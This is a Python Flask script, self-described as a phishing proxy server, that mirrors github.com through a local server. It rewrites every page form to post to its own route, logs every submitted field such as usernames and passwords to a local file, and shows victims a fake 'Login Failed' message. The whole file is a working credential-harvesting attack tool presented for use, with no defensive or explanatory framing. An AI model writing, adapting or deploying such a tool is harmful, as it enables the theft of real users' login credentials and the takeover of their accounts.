import requests
from flask import Flask, request, Response
from bs4 import BeautifulSoup
import os
import datetime
from urllib.parse import urlparse, urlunparse

app = Flask(__name__)

# --- CONFIGURATION ---
# The real website we are cloning.
TARGET_HOST = "github.com"
# The protocol to use (http:// or https://)
TARGET_PROTOCOL = "https://"
# The file to save credentials to.
LOG_FILE = "captured_credentials.txt"


def rewrite_links(content, response_headers, final_url):
    content_type = response_headers.get('Content-Type', '')
    encoding = 'utf-8'
    if 'charset=' in content_type:
        encoding = content_type.split('charset=')[-1]
    
    soup = BeautifulSoup(content, 'html.parser', from_encoding=encoding)
    
    # We need the base URL of the *final* destination to correctly rewrite links
    parsed_final_url = urlparse(final_url)
    
    for tag in soup.find_all(href=True):
        if tag['href'].startswith('/'):
            # Rewrite relative links to be absolute to our server
            tag['href'] = f"/{tag['href'].lstrip('/')}"
            
    for tag in soup.find_all(src=True):
        if tag['src'].startswith('/'):
            tag['src'] = f"/{tag['src'].lstrip('/')}"

    for form in soup.find_all('form'):
        # The action should point to our local /submit route
        form['action'] = "/submit_credentials"
        
    return str(soup)


@app.route('/submit_credentials', methods=['POST'])
def submit_credentials():
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data_str = "\n".join([f"  {key}: {value}" for key, value in request.form.items()])
    log_entry = (f"====================[{timestamp}]====================\n"
                 f"CREDENTIALS CAPTURED:\n{data_str}\n"
                 f"========================================================\n\n")
    with open(LOG_FILE, "a") as f:
        f.write(log_entry)
    print(f"[+] Credentials captured at {timestamp} and saved to {LOG_FILE}")
    return "<h1>Login Failed</h1><p>The username or password was incorrect. Please try again later.</p>"


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy_request(path):
    # Construct the initial target URL
    target_url = f"{TARGET_PROTOCOL}{TARGET_HOST}/{path}"
    
    headers = {key: value for (key, value) in request.headers if key.lower() != 'host'}
    headers['Host'] = TARGET_HOST
    
    try:
        # --- KEY CHANGE: WE NOW ALLOW REDIRECTS ---
        # The 'requests' library will handle the 301 redirect automatically.
        resp = requests.request(
            method=request.method,
            url=target_url,
            headers=headers,
            data=request.get_data(),
            cookies=request.cookies,
            allow_redirects=True, # This is True by default, but we're being explicit
            stream=True)
            
        # The final URL after any redirects
        final_url = resp.url
        print(f"[*] Initial request to {target_url}, final URL after redirect: {final_url}")
            
        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        headers = [(name, value) for (name, value) in resp.raw.headers.items() if name.lower() not in excluded_headers]
        
        content_type = resp.headers.get('Content-Type', '')
        
        if 'text/html' in content_type:
            # We pass the final URL to the rewriter to handle relative links correctly
            content = rewrite_links(resp.content, resp.headers, final_url)
            response = Response(content, resp.status_code, headers)
            return response
        else:
            response = Response(resp.iter_content(chunk_size=1024), resp.status_code, headers)
            return response

    except requests.exceptions.RequestException as e:
        print(f"[!] Proxying Error: {e}")
        return "<h1>Proxy Error</h1><p>Could not connect to the target server.</p>", 502


if __name__ == '__main__':
    print("Starting Standalone Phishing Proxy Server...")
    print(f"Targeting: {TARGET_PROTOCOL}{TARGET_HOST}")
    print(f"Credentials will be logged to: {LOG_FILE}")
    app.run(port=5000, debug=False)